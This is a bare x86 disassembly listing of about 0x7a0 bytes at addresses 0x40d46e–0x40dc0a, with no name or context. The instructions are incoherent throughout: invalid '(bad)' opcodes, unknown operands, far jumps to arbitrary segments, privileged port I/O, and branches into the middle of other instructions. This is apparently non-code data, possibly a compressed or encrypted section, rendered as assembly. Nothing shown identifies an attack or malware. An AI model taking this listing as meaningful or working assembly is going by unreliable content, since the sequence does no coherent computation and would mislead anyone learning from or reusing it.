  40d46e:	bound  edi,QWORD PTR [ebp+0x67e4726e]
  40d474:	xchg   edi,eax
  40d475:	call   0xe6b90319
  40d47a:	or     esi,DWORD PTR [ebx+0x73]
  40d47d:	jmp    0x9f26:0x9860a1ab
  40d484:	pop    ebx
  40d485:	jbe    0x40d435
  40d487:	add    eax,0x10ec8c45
  40d48c:	test   eax,0x3f8261d3
  40d491:	pop    edx
  40d492:	jmp    FWORD PTR [eax]
  40d494:	inc    ecx
  40d495:	idiv   BYTE PTR [eax-0x4e]
  40d498:	mov    dl,0x57
  40d49a:	call   0xf9e5c70b
  40d49f:	outs   dx,BYTE PTR ds:[esi]
  40d4a0:	in     eax,dx
  40d4a1:	into   
  40d4a2:	push   ebx
  40d4a3:	ror    DWORD PTR [edi-0x3a0cb46],0xf9
  40d4aa:	add    DWORD PTR [esi+ebx*4-0xf938d18],ecx
  40d4b1:	out    dx,eax
  40d4b2:	and    bl,BYTE PTR [edi+0x36]
  40d4b5:	aas    
  40d4b6:	rcl    BYTE PTR [ecx+0x1f],1
  40d4b9:	push   eax
  40d4ba:	test   BYTE PTR [ebx-0x66],0xc3
  40d4be:	jl     0x40d526
  40d4c0:	push   0xffffff9d
  40d4c2:	mov    DWORD PTR [edx+0x16],0xe5567c13
  40d4c9:	or     al,0xb6
  40d4cb:	and    eax,0x93b8f8ad
  40d4d0:	or     eax,0x5cf2bfa5
  40d4d5:	push   edi
  40d4d6:	jb     0x40d4d1
  40d4d8:	sub    BYTE PTR [eax],dl
  40d4da:	cmp    edi,0x62
  40d4dd:	jno    0x40d558
  40d4df:	mov    BYTE PTR [ebx],dh
  40d4e1:	xor    esp,DWORD PTR [edx]
  40d4e3:	jno    0x40d534
  40d4e5:	data16 aaa 
  40d4e7:	mov    al,0x77
  40d4e9:	xor    eax,0xceff48a1
  40d4ee:	xchg   esi,eax
  40d4ef:	add    edi,0x49
  40d4f2:	scas   eax,DWORD PTR es:[edi]
  40d4f3:	imul   ebx
  40d4f5:	mov    ebp,0x90eed2c2
  40d4fa:	fnstcw WORD PTR [eax]
  40d4fc:	sti    
  40d4fd:	xor    BYTE PTR [ecx],al
  40d4ff:	mov    eax,ds:0xf496fa6c
  40d504:	mov    ?,WORD PTR [eax+0x32c2fcb0]
  40d50a:	fdiv   DWORD PTR [ebx+edi*2]
  40d50d:	jg     0x40d526
  40d50f:	and    BYTE PTR [esi+0x3e46986e],bh
  40d515:	push   ss
  40d516:	les    ebx,FWORD PTR [edx-0x3ffc0b5e]
  40d51c:	jnp    0x40d58b
  40d51e:	adc    cl,BYTE PTR [eax+0x3a9b037c]
  40d524:	jmp    0x40d4e1
  40d526:	cmp    cl,0xf1
  40d529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d52a:	ror    DWORD PTR [edx+0x2758836d],0xf2
  40d531:	pop    ds
  40d532:	shl    DWORD PTR [edi+0x71],cl
  40d535:	adc    eax,0x2407d019
  40d53a:	enter  0xd6a8,0x7f
  40d53e:	repnz dec esp
  40d540:	popf   
  40d541:	jg     0x40d4c4
  40d543:	(bad)  
  40d544:	push   cs
  40d545:	in     al,0xf6
  40d547:	retfw  
  40d549:	cmp    dl,cl
  40d54b:	sub    eax,DWORD PTR [edi+0x10bd9a3d]
  40d551:	scas   al,BYTE PTR es:[edi]
  40d552:	cmp    eax,0xf35ea6af
  40d557:	push   eax
  40d558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d559:	bts    DWORD PTR [edi+0x5bd7d1c8],0xb6
  40d561:	mov    al,0xb5
  40d563:	aam    0xb7
  40d565:	mov    esp,DWORD PTR [eax-0x78cd3ea6]
  40d56b:	data16 cmc 
  40d56d:	mov    DWORD PTR [esi+edx*2+0xa7f7df8],edi
  40d574:	jne    0x40d555
  40d576:	clc    
  40d577:	pop    ecx
  40d578:	nop
  40d579:	mov    al,0xbc
  40d57b:	and    eax,0x54920495
  40d580:	lds    ebx,FWORD PTR [ebx]
  40d582:	xor    al,0x2c
  40d584:	jmp    0xe6d0:0x9c693e48
  40d58b:	aaa    
  40d58c:	mov    eax,0x748709b3
  40d591:	cmp    al,0x25
  40d593:	jb     0x40d571
  40d595:	mov    ch,0x7b
  40d597:	sbb    bh,cl
  40d599:	std    
  40d59a:	loop   0x40d58f
  40d59c:	in     eax,0x32
  40d59e:	push   ss
  40d59f:	js     0x40d60e
  40d5a1:	push   edi
  40d5a2:	(bad)  
  40d5a4:	lea    ebp,[edi-0x27]
  40d5a7:	sub    dl,BYTE PTR [eax+0x2080ee23]
  40d5ad:	outs   dx,DWORD PTR ds:[esi]
  40d5ae:	out    dx,al
  40d5af:	sbb    ecx,0x4879f169
  40d5b5:	mov    gs,WORD PTR [esi]
  40d5b7:	xchg   BYTE PTR [edi-0x167a939e],dl
  40d5bd:	pop    edi
  40d5be:	aas    
  40d5bf:	inc    ebp
  40d5c0:	pop    esp
  40d5c1:	out    dx,eax
  40d5c2:	out    dx,al
  40d5c3:	push   ebp
  40d5c4:	xchg   esp,eax
  40d5c5:	adc    eax,0xc17713a3
  40d5ca:	pop    ss
  40d5cb:	int    0xc0
  40d5cd:	fnstcw WORD PTR [ebx]
  40d5cf:	push   cs
  40d5d0:	add    BYTE PTR [edx-0x479e6c6e],0x42
  40d5d7:	arpl   WORD PTR [eax+eiz*2-0x1f],bx
  40d5db:	cmp    edi,edx
  40d5dd:	pop    esp
  40d5de:	popa   
  40d5df:	add    ecx,ebp
  40d5e1:	or     BYTE PTR [edi+0x14],ch
  40d5e4:	out    dx,al
  40d5e5:	jecxz  0x40d5e3
  40d5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5e8:	imul   esi,DWORD PTR [ebx+0x26],0xffffff9b
  40d5ec:	xchg   edx,eax
  40d5ed:	mov    esi,0x3ca50e9f
  40d5f2:	and    eax,DWORD PTR [esi+0x72393d03]
  40d5f8:	sub    ecx,DWORD PTR [edx+0x2d19d3cd]
  40d5fe:	mov    DWORD PTR [ebp+esi*8-0x74],edx
  40d602:	adc    ah,bh
  40d604:	in     al,0x8c
  40d606:	cmc    
  40d607:	shr    BYTE PTR [ebx],1
  40d609:	xchg   edi,eax
  40d60a:	jae    0x40d5d5
  40d60c:	lods   eax,DWORD PTR ds:[esi]
  40d60d:	mov    BYTE PTR ds:0x23f10c7f,al
  40d613:	out    0x13,al
  40d615:	push   ecx
  40d616:	pop    es
  40d617:	das    
  40d618:	mov    ds:0x10fbdcd9,eax
  40d61d:	fisttp QWORD PTR [ecx+0x24]
  40d620:	loope  0x40d5f4
  40d622:	jle    0x40d602
  40d624:	in     eax,0x2d
  40d626:	mov    cl,0x3
  40d628:	pushf  
  40d629:	popf   
  40d62a:	or     esi,esp
  40d62c:	dec    edx
  40d62d:	fsub   st(5),st
  40d62f:	xor    al,0x90
  40d631:	jb     0x40d5e3
  40d633:	les    ebp,FWORD PTR [edx+eax*4]
  40d636:	add    cl,BYTE PTR [ebp-0x5e]
  40d639:	(bad)  
  40d63a:	xor    eax,0xea7b40fb
  40d63f:	mov    al,ds:0x64bc7e68
  40d644:	fmul   QWORD PTR [edi]
  40d646:	cmp    al,0xde
  40d649:	and    eax,0x298eff7c
  40d64e:	push   es
  40d64f:	mov    dl,0x62
  40d651:	xchg   edx,eax
  40d652:	cmp    DWORD PTR [eax+0x7c],0xb80437c6
  40d659:	xchg   edx,eax
  40d65a:	data16 icebp 
  40d65c:	add    DWORD PTR [edi+0x697f689d],esi
  40d662:	bound  ebx,QWORD PTR [esi-0x27]
  40d665:	test   al,0xd2
  40d667:	fmul   st,st(4)
  40d669:	mov    esp,0xf2b2d8f8
  40d66e:	ins    BYTE PTR es:[edi],dx
  40d66f:	mov    edx,0xe9faa1b6
  40d674:	aam    0xf4
  40d676:	add    eax,0x95c7d3e3
  40d67b:	jnp    0x40d66a
  40d67d:	sbb    eax,0x3245d575
  40d682:	dec    ebp
  40d683:	daa    
  40d684:	cdq    
  40d685:	or     DWORD PTR ds:0x4e361bc7,esi
  40d68b:	out    0x28,al
  40d68d:	inc    esp
  40d68e:	mov    eax,ebp
  40d690:	add    al,0xcf
  40d692:	in     eax,0xb8
  40d694:	xor    BYTE PTR [eax],0x23
  40d697:	(bad)  
  40d698:	into   
  40d699:	or     edx,DWORD PTR [ebp+0x56]
  40d69c:	xlat   BYTE PTR ds:[ebx]
  40d69d:	test   eax,0xf623dd1a
  40d6a2:	or     bl,BYTE PTR [di]
  40d6a5:	and    ebx,ecx
  40d6a7:	jnp    0x40d6fd
  40d6a9:	add    al,0x81
  40d6ab:	nop
  40d6ac:	jp     0x40d652
  40d6ae:	pushf  
  40d6af:	lods   al,BYTE PTR ds:[esi]
  40d6b0:	into   
  40d6b1:	sub    eax,0x59b9d5dc
  40d6b6:	ds sub eax,0xd8d358a8
  40d6bc:	fsubr  DWORD PTR [esi+0x127b9c8]
  40d6c2:	rol    BYTE PTR [esi+0x3a],1
  40d6c5:	sbb    BYTE PTR [edx+ecx*4-0x6bc29b9f],bl
  40d6cc:	xchg   ebp,eax
  40d6cd:	ret    0xbdd0
  40d6d0:	dec    esp
  40d6d1:	lahf   
  40d6d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6d3:	loop   0x40d66d
  40d6d5:	xchg   edi,eax
  40d6d6:	lods   al,BYTE PTR ds:[esi]
  40d6d7:	dec    eax
  40d6d8:	xchg   esi,eax
  40d6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6da:	sub    al,0x48
  40d6dd:	jmp    0x84e6be29
  40d6e2:	pop    es
  40d6e3:	(bad)
  40d6e7:	and    al,0xcd
  40d6e9:	xor    DWORD PTR [ecx+0x49],ebp
  40d6ec:	aas    
  40d6ed:	call   DWORD PTR [edx-0x103498a8]
  40d6f3:	test   eax,0xff2685a5
  40d6f8:	xor    dh,BYTE PTR ds:0x5108de69
  40d6fe:	or     al,bh
  40d700:	dec    ebp
  40d701:	jmp    0x40d744
  40d703:	mov    edi,0x59728250
  40d708:	inc    ecx
  40d709:	jb     0x40d69c
  40d70b:	jno    0x40d723
  40d70d:	mov    dh,0x7a
  40d70f:	push   es
  40d710:	cs inc ebx
  40d712:	fs or  eax,0x37885125
  40d718:	cmc    
  40d719:	sub    al,0xca
  40d71b:	stc    
  40d71c:	mov    cl,0x4b
  40d71e:	jno    0x40d74e
  40d720:	stos   DWORD PTR es:[edi],eax
  40d721:	sbb    DWORD PTR [ecx],esi
  40d723:	sahf   
  40d724:	cwde   
  40d725:	mov    ah,0xc3
  40d727:	push   edi
  40d728:	sub    al,0xf3
  40d72a:	in     al,0x2f
  40d72c:	mov    ds:0x7b0c328f,al
  40d731:	cmc    
  40d732:	lock sub bl,dl
  40d735:	mov    edi,0xa93e9dfd
  40d73a:	mov    edi,0x94b676e7
  40d73f:	push   ds
  40d740:	int    0xa
  40d742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d743:	dec    edi
  40d744:	stos   BYTE PTR es:[edi],al
  40d745:	mov    edx,0xcf78a188
  40d74a:	cmp    BYTE PTR [edi+0x47a7008f],dl
  40d750:	(bad)  
  40d752:	jg     0x40d6f5
  40d754:	(bad)
  40d757:	push   esi
  40d758:	sbb    DWORD PTR [edx-0x1e78f5a4],esi
  40d75e:	adc    eax,0xffe9cbae
  40d763:	aad    0x12
  40d765:	pushf  
  40d766:	mov    edi,0xb803c1b9
  40d76b:	sub    eax,0x116778e3
  40d770:	inc    ecx
  40d771:	pop    esi
  40d772:	ror    esp,0x87
  40d775:	jb     0x40d78c
  40d777:	push   edx
  40d778:	and    al,0xd
  40d77a:	add    ch,ah
  40d77c:	dec    ecx
  40d77d:	adc    eax,0x3704815c
  40d782:	fild   WORD PTR [edi]
  40d784:	or     DWORD PTR [esi-0x55e0020d],edx
  40d78a:	nop
  40d78b:	mov    al,ds:0x90182a5d
  40d790:	das    
  40d791:	xchg   ah,dl
  40d793:	pushf  
  40d794:	icebp  
  40d795:	mov    WORD PTR [eax-0x284cbc68],es
  40d79b:	lds    ecx,FWORD PTR [ecx]
  40d79d:	add    BYTE PTR [ecx],ah
  40d79f:	stc    
  40d7a0:	add    ebx,ecx
  40d7a2:	mov    dl,al
  40d7a4:	test   BYTE PTR [ebx-0xeb9bb60],ch
  40d7aa:	jle    0x40d75e
  40d7ac:	stc    
  40d7ad:	out    dx,eax
  40d7ae:	add    BYTE PTR [ecx+eax*4+0x4],al
  40d7b2:	ret    
  40d7b3:	adc    BYTE PTR [ecx+0x5a],ah
  40d7b6:	rcl    BYTE PTR [ebx],cl
  40d7b8:	mov    esi,0x55dd96b1
  40d7bd:	mov    BYTE PTR [esi+eiz*8],ah
  40d7c0:	xchg   esp,eax
  40d7c1:	leave  
  40d7c2:	xor    DWORD PTR [eax],0x2b
  40d7c5:	je     0x40d784
  40d7c7:	int    0xb8
  40d7c9:	sahf   
  40d7ca:	or     bh,BYTE PTR [eax]
  40d7cc:	push   cs
  40d7cd:	jmp    0x6408:0x39019d84
  40d7d4:	mov    ah,0xa3
  40d7d6:	jmp    0x40d765
  40d7d8:	sbb    bl,BYTE PTR [eax]
  40d7da:	ficom  DWORD PTR [eax+ecx*8]
  40d7dd:	dec    edi
  40d7de:	aam    0x1f
  40d7e0:	enter  0x7691,0x1e
  40d7e4:	cmp    eax,esp
  40d7e6:	push   0xffffffff
  40d7e8:	into   
  40d7e9:	inc    edi
  40d7ea:	add    BYTE PTR [edx-0x2f785ec7],al
  40d7f0:	mov    ds:0x6a399f12,eax
  40d7f5:	ficomp WORD PTR [ebp+esi*4+0x47033907]
  40d7fc:	push   ecx
  40d7fd:	mov    WORD PTR [edi-0x66],?
  40d800:	mov    al,0xdf
  40d802:	and    al,0xca
  40d804:	mov    ah,0x64
  40d806:	sahf   
  40d807:	(bad)  
  40d808:	int3   
  40d809:	xor    eax,0x50bb1c8e
  40d80e:	jecxz  0x40d7fa
  40d810:	xor    cl,0xf6
  40d813:	xor    eax,0xcaf61d54
  40d818:	inc    esi
  40d819:	xchg   edi,eax
  40d81a:	cld    
  40d81b:	push   0x21
  40d81d:	jno    0x40d850
  40d81f:	aas    
  40d820:	hlt    
  40d821:	dec    edx
  40d822:	mov    ch,0xa9
  40d824:	jmp    DWORD PTR [edx+0x69135571]
  40d82a:	scas   eax,DWORD PTR es:[edi]
  40d82b:	shl    DWORD PTR [esi-0x79],cl
  40d82e:	je     0x40d7d8
  40d830:	jnp    0x40d7bf
  40d832:	out    dx,al
  40d833:	(bad)  
  40d834:	les    eax,FWORD PTR [eax]
  40d836:	and    eax,0x8b811f17
  40d83b:	or     ebp,eax
  40d83d:	repnz add DWORD PTR [eax-0x49],eax
  40d841:	fisttp DWORD PTR [eax+0x1e]
  40d844:	mov    cl,0xd0
  40d846:	jnp    0x40d84e
  40d848:	mov    bl,0x82
  40d84a:	daa    
  40d84b:	mov    al,0xc6
  40d84d:	xchg   ecx,eax
  40d84e:	hlt    
  40d84f:	jno    0x40d82f
  40d851:	int    0x7
  40d853:	scas   eax,DWORD PTR es:[edi]
  40d854:	mov    esi,0xa0d015b7
  40d859:	dec    esp
  40d85a:	test   cl,bh
  40d85c:	dec    eax
  40d85d:	test   al,0x89
  40d85f:	xchg   edi,eax
  40d860:	mov    edx,0xb230755c
  40d865:	jbe    0x40d837
  40d867:	pop    ds
  40d868:	fst    QWORD PTR [eax-0x67a67e]
  40d86e:	sbb    BYTE PTR [eax+0x5e],bh
  40d871:	dec    esi
  40d872:	jp     0x40d85a
  40d874:	je     0x40d884
  40d876:	cli    
  40d877:	xchg   BYTE PTR [edx+0x7d35b003],bl
  40d87d:	(bad)  
  40d87e:	mov    ecx,0x842f66ae
  40d883:	inc    edx
  40d884:	push   ds
  40d885:	dec    esi
  40d886:	pop    edx
  40d887:	cmp    al,0x25
  40d889:	sbb    al,0xb5
  40d88b:	leave  
  40d88c:	int3   
  40d88d:	push   cs
  40d88e:	lea    edi,[ebp-0x34]
  40d891:	aas    
  40d892:	outs   dx,BYTE PTR ds:[esi]
  40d893:	rcr    BYTE PTR [ecx],cl
  40d895:	call   0xe0d6:0xf80c5629
  40d89c:	or     eax,0xc312571f
  40d8a1:	xchg   DWORD PTR [edi-0x40],ebx
  40d8a4:	mov    ebx,0xa60a4352
  40d8a9:	(bad)  
  40d8ab:	pusha  
  40d8ac:	dec    edx
  40d8ad:	add    al,0xed
  40d8af:	div    BYTE PTR [esi+0x4a]
  40d8b2:	pop    ss
  40d8b3:	addr16 imul edx
  40d8b6:	rcr    BYTE PTR [esi],cl
  40d8b8:	sub    DWORD PTR [ecx-0x35990cbf],esp
  40d8be:	addr16 sub eax,0xd1413f41
  40d8c4:	into   
  40d8c5:	xlat   BYTE PTR ds:[ebx]
  40d8c6:	(bad)  
  40d8c7:	ja     0x40d8d7
  40d8c9:	(bad)  
  40d8ca:	das    
  40d8cb:	out    0x81,eax
  40d8cd:	lahf   
  40d8ce:	out    0x21,eax
  40d8d0:	adc    al,0x34
  40d8d2:	push   DWORD PTR [eax-0x791a4e25]
  40d8d8:	cld    
  40d8d9:	push   eax
  40d8da:	sub    ah,bl
  40d8dc:	rcr    DWORD PTR ds:0xadd4f486,0xdd
  40d8e3:	and    DWORD PTR cs:[esi+0x4fb1226e],esi
  40d8ea:	fadd   QWORD PTR [esi]
  40d8ec:	std    
  40d8ed:	das    
  40d8ee:	mov    eax,0x2e91c852
  40d8f3:	in     eax,dx
  40d8f4:	sbb    edi,esp
  40d8f6:	mov    bl,0xc0
  40d8f8:	pop    ecx
  40d8f9:	mov    ecx,0x6a04f758
  40d8fe:	inc    edi
  40d8ff:	pop    ebp
  40d900:	pop    eax
  40d901:	or     DWORD PTR [ecx],esi
  40d903:	mov    ecx,0xaa68259c
  40d908:	hlt    
  40d909:	mov    ebp,0x652bae1c
  40d90e:	mov    BYTE PTR [esp+ebp*8],bl
  40d911:	xor    BYTE PTR [ecx+0x4b],bh
  40d914:	lea    ebp,[edx+eiz*4-0x1a]
  40d918:	addps  xmm2,XMMWORD PTR [ecx-0x73]
  40d91c:	pop    esi
  40d91d:	std    
  40d91e:	stc    
  40d91f:	and    bh,BYTE PTR [edx+eax*8+0x1ecfd72f]
  40d926:	mov    bh,0xd2
  40d928:	sbb    edx,ebp
  40d92a:	aam    0x9a
  40d92c:	(bad)  
  40d92e:	cdq    
  40d92f:	ja     0x40d97b
  40d931:	in     al,dx
  40d932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d933:	call   0x5b2633d4
  40d938:	mov    dh,0x50
  40d93a:	pop    edx
  40d93b:	mov    ah,0x37
  40d93d:	leave  
  40d93e:	dec    eax
  40d93f:	es mov esi,0xf02a7be6
  40d945:	inc    esp
  40d946:	cmp    eax,0x36cc68e2
  40d94b:	out    0x88,al
  40d94d:	push   0x3f55d38d
  40d952:	sbb    BYTE PTR [edi+0x7],al
  40d955:	push   es
  40d956:	dec    ecx
  40d957:	mov    edi,0xfaf3e35e
  40d95c:	popa   
  40d95d:	pop    ds
  40d95e:	in     eax,dx
  40d95f:	mov    esp,0x311c6703
  40d964:	or     DWORD PTR [ecx],esp
  40d966:	xchg   ebp,eax
  40d967:	outs   dx,DWORD PTR ds:[esi]
  40d968:	inc    esp
  40d969:	cmc    
  40d96a:	mov    ss,WORD PTR ds:0xd0a51b0d
  40d970:	pop    esp
  40d971:	mov    dl,0xa7
  40d973:	cmp    al,0xf5
  40d975:	mov    edi,DWORD PTR [edx-0x69]
  40d978:	iret   
  40d979:	test   al,0x3d
  40d97b:	mov    ds:0x2b290c44,eax
  40d980:	shr    BYTE PTR [edi-0x2be84c2f],1
  40d986:	nop
  40d987:	xchg   esi,eax
  40d988:	cmc    
  40d989:	sub    eax,DWORD PTR ds:0x413c733f
  40d98f:	xchg   esp,eax
  40d990:	or     BYTE PTR cs:[ecx+0x49fcd13c],dl
  40d997:	and    DWORD PTR [ebx+0x74c33dbe],0x67
  40d99e:	pop    esp
  40d99f:	ret    
  40d9a0:	cmp    al,bh
  40d9a2:	ins    DWORD PTR es:[edi],dx
  40d9a3:	repnz cmp edx,DWORD PTR [edi+ecx*4+0x5cd8a99f]
  40d9ab:	repz loop 0x40da21
  40d9ae:	(bad)  
  40d9af:	jmp    FWORD PTR [edi+0x0]
  40d9b2:	outs   dx,BYTE PTR ss:[esi]
  40d9b4:	inc    esi
  40d9b5:	stos   DWORD PTR es:[edi],eax
  40d9b6:	sti    
  40d9b7:	or     dl,cl
  40d9b9:	jge    0x40d970
  40d9bb:	or     BYTE PTR [edi+0x14],dl
  40d9be:	push   ebp
  40d9bf:	xchg   ecx,eax
  40d9c0:	jle    0x40d9a6
  40d9c2:	xchg   esp,eax
  40d9c3:	fnsave [edi-0x694354f2]
  40d9c9:	pop    eax
  40d9ca:	xchg   edx,eax
  40d9cb:	cwde   
  40d9cc:	xor    ebp,DWORD PTR [eax-0x7c5f970b]
  40d9d2:	pop    ds
  40d9d3:	push   ds
  40d9d4:	and    al,0xaf
  40d9d6:	push   eax
  40d9d7:	(bad)  
  40d9d8:	xlat   BYTE PTR ds:[ebx]
  40d9d9:	sbb    al,0x37
  40d9db:	jo     0x40d9e9
  40d9dd:	imul   ebx,edi,0x9f4565d7
  40d9e3:	das    
  40d9e4:	retf   
  40d9e5:	addr16 mov cl,0x1
  40d9e8:	xor    ecx,DWORD PTR [edx]
  40d9ea:	pop    es
  40d9eb:	sub    eax,0xeabada97
  40d9f0:	lock (bad) 
  40d9f2:	jmp    0x40da3c
  40d9f4:	call   0x8e1f:0xa1e4fd7b
  40d9fb:	mov    ebp,0x1f636a5a
  40da00:	das    
  40da01:	jge    0x40da7e
  40da03:	adc    ebx,ebp
  40da05:	jae    0x40d9ed
  40da07:	jl     0x40da2e
  40da09:	enter  0xd4d5,0xfe
  40da0d:	push   0xafef24e7
  40da12:	xor    al,bl
  40da14:	sub    eax,ecx
  40da16:	jle    0x40d9a1
  40da18:	adc    DWORD PTR [edx],ebp
  40da1a:	sbb    dl,bl
  40da1c:	jb     0x40da8b
  40da1e:	cmp    DWORD PTR [ecx],edx
  40da20:	and    edx,esi
  40da22:	cdq    
  40da23:	ficom  WORD PTR [edx-0x3a192228]
  40da29:	pop    esp
  40da2a:	sub    BYTE PTR [esi+eax*8+0x59],al
  40da2e:	inc    ebp
  40da2f:	mov    cl,dl
  40da31:	xlat   BYTE PTR ds:[ebx]
  40da32:	add    eax,0x46f756db
  40da37:	dec    edi
  40da38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da39:	xchg   ecx,eax
  40da3a:	rcr    bh,cl
  40da3c:	outs   dx,DWORD PTR ds:[esi]
  40da3d:	inc    edi
  40da3e:	and    eax,0xa6128944
  40da43:	dec    edx
  40da44:	test   eax,0x50fa2c6d
  40da49:	fdivr  DWORD PTR [eax-0x17]
  40da4c:	in     eax,dx
  40da4d:	imul   edi,DWORD PTR [esi],0x819fb837
  40da53:	mov    al,0x59
  40da55:	test   DWORD PTR [esp+ebx*1-0x17],esi
  40da59:	inc    ecx
  40da5a:	cmp    al,0x1
  40da5c:	out    dx,al
  40da5d:	leave  
  40da5e:	inc    esp
  40da5f:	pop    edx
  40da60:	xchg   edi,eax
  40da61:	(bad)  
  40da62:	test   al,0x4
  40da64:	sbb    eax,DWORD PTR [ebx+0xa]
  40da67:	inc    esi
  40da68:	arpl   WORD PTR [edx-0x2de3a2e4],dx
  40da6e:	sbb    al,0x7c
  40da70:	sub    bh,BYTE PTR [ebx+0x2]
  40da73:	push   0xdf5f5c42
  40da78:	sbb    BYTE PTR [ebp-0x6c68d0ce],bh
  40da7e:	test   DWORD PTR [ebp-0x56066415],ecx
  40da84:	fdivr  st(6),st
  40da86:	or     DWORD PTR [ebp+0x3e],esp
  40da89:	jg     0x40dae5
  40da8b:	jecxz  0x40daca
  40da8d:	mov    WORD PTR [edi-0x7dad146a],?
  40da93:	dec    ebx
  40da94:	imul   ebx,DWORD PTR [eax],0x8d854ec
  40da9a:	push   ecx
  40da9b:	je     0x40dadf
  40da9d:	push   ebx
  40da9e:	push   cs
  40da9f:	fisttp QWORD PTR [ebp+0xcf2db75]
  40daa5:	push   ss
  40daa6:	mov    edx,0xd8865117
  40daab:	in     eax,0xe5
  40daad:	nop
  40daae:	jmp    0xe231:0x57f2640c
  40dab5:	mov    dl,0xb6
  40dab7:	xchg   edx,eax
  40dab8:	push   es
  40dab9:	xor    al,0x90
  40dabb:	xor    DWORD PTR ss:[edi],ebp
  40dabe:	cmp    DWORD PTR [edx+0x1b286f0a],ecx
  40dac4:	(bad)  
  40dac5:	jp     0x40db31
  40dac7:	or     BYTE PTR [esi+0x1e],cl
  40daca:	and    BYTE PTR [edi-0x6e],bh
  40dacd:	mov    BYTE PTR [esi+eiz*4+0x3e9638b2],cl
  40dad4:	jg     0x40da89
  40dad6:	pushf  
  40dad7:	mov    WORD PTR [eax],cs
  40dad9:	push   ss
  40dada:	xor    edi,DWORD PTR [eax-0x4562f063]
  40dae0:	int    0xf
  40dae2:	std    
  40dae3:	rol    DWORD PTR [ecx-0x33],cl
  40dae6:	call   0x55350657
  40daeb:	retf   0x2d95
  40daee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daef:	push   edi
  40daf0:	and    eax,0x789fd7d5
  40daf5:	imul   ecx,DWORD PTR [ebx+edi*2],0xffffff9a
  40daf9:	sub    ebp,edx
  40dafb:	pop    dx
  40dafd:	mov    ah,BYTE PTR [esi]
  40daff:	xchg   ebp,eax
  40db00:	sub    DWORD PTR [ebp-0x5e],ecx
  40db03:	jge    0x40db1a
  40db05:	test   DWORD PTR [eax],ebp
  40db07:	jmp    0x99cc:0x607a1413
  40db0e:	ret    
  40db0f:	jbe    0x40db7f
  40db11:	pop    ebx
  40db12:	jg     0x40db5e
  40db14:	xor    eax,0x3810dd8
  40db19:	push   esi
  40db1a:	fdiv   QWORD PTR [esi]
  40db1c:	pop    es
  40db1d:	out    dx,eax
  40db1e:	fidiv  WORD PTR [edx+0x230e2574]
  40db24:	xchg   esi,eax
  40db25:	outs   dx,BYTE PTR ds:[esi]
  40db26:	pushf  
  40db27:	cmp    eax,0xef931733
  40db2c:	inc    edx
  40db2d:	cdq    
  40db2e:	stos   BYTE PTR es:[edi],al
  40db2f:	stos   DWORD PTR es:[edi],eax
  40db30:	call   DWORD PTR [eax-0x35]
  40db33:	xchg   esp,eax
  40db34:	jmp    0x40db9c
  40db36:	xor    BYTE PTR [eax-0x1d],bl
  40db39:	or     al,0xef
  40db3b:	ret    
  40db3c:	sbb    al,0x73
  40db3e:	outs   dx,DWORD PTR ds:[esi]
  40db3f:	push   ss
  40db40:	clc    
  40db41:	int    0x8
  40db43:	or     DWORD PTR [eax+ecx*2-0x3c],ecx
  40db47:	jp     0x40dbac
  40db49:	pop    esp
  40db4a:	xor    al,0x95
  40db4d:	das    
  40db4e:	outs   dx,DWORD PTR ds:[esi]
  40db4f:	pop    edi
  40db50:	call   0x4d5c:0x4d32378c
  40db57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db58:	and    ecx,ecx
  40db5a:	mov    al,ds:0x972691af
  40db5f:	cs icebp 
  40db61:	sbb    ebx,edi
  40db63:	addr16 pop edx
  40db65:	mov    ds:0x424e2e2c,al
  40db6a:	dec    edi
  40db6b:	sbb    bh,BYTE PTR [bp+si-0xa]
  40db6f:	cmp    cl,BYTE PTR [ebx+0x6d]
  40db72:	call   DWORD PTR [ebp+0x12]
  40db75:	cs push esi
  40db77:	adc    BYTE PTR [ecx+0x32],al
  40db7a:	jne    0x40db8a
  40db7c:	mov    edx,0x67ab6461
  40db81:	out    dx,al
  40db82:	sub    DWORD PTR [ecx+0x47a69e8a],edx
  40db88:	call   0xc7be40b9
  40db8d:	ret    
  40db8e:	scas   eax,DWORD PTR es:[edi]
  40db8f:	or     edi,DWORD PTR ds:0xca34f6d5
  40db95:	stc    
  40db96:	test   ebp,edx
  40db98:	adc    eax,0xcfd035a8
  40db9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db9e:	mov    cl,BYTE PTR [eax+0x2c316fdd]
  40dba4:	inc    esp
  40dba5:	rcr    ebx,1
  40dba7:	push   ebp
  40dba8:	sti    
  40dba9:	xor    esi,edi
  40dbab:	push   es
  40dbac:	pusha  
  40dbad:	add    BYTE PTR [esp+esi*1+0x2351e65c],al
  40dbb4:	pop    eax
  40dbb5:	mov    eax,0xad2c1755
  40dbba:	imul   eax,DWORD PTR [eax+0x6ab53db8],0x6f
  40dbc1:	lds    edx,FWORD PTR [esi-0x1a6a9423]
  40dbc7:	je     0x40db86
  40dbc9:	test   al,0xb3
  40dbcb:	popa   
  40dbcc:	fwait
  40dbcd:	pop    esp
  40dbce:	xor    al,0x76
  40dbd0:	imul   ebp,DWORD PTR [esi+0x7d],0xffffff8f
  40dbd4:	add    DWORD PTR [eax],ecx
  40dbd6:	xchg   ecx,eax
  40dbd7:	sub    BYTE PTR [ecx+edi*1+0x713dbf59],0x68
  40dbdf:	lock loop 0x40db8f
  40dbe2:	adc    BYTE PTR [ebp-0x21ac20da],al
  40dbe8:	shl    BYTE PTR [ecx+edi*1+0x7f085489],cl
  40dbef:	sub    BYTE PTR [esi-0x59],bh
  40dbf2:	ja     0x40db99
  40dbf4:	enter  0xecf0,0x9c
  40dbf8:	mov    ebx,0xd5720097
  40dbfd:	xchg   ebp,eax
  40dbfe:	imul   ebx,DWORD PTR [ebx+0x28],0xffffffed
  40dc02:	shl    DWORD PTR [ebx],0xd7
  40dc05:	bound  esi,QWORD PTR [ebp-0x73]
  40dc08:	dec    esp
  40dc09:	dec    ebx
  40dc0a:	ins    BYTE PTR es:[edi],dx
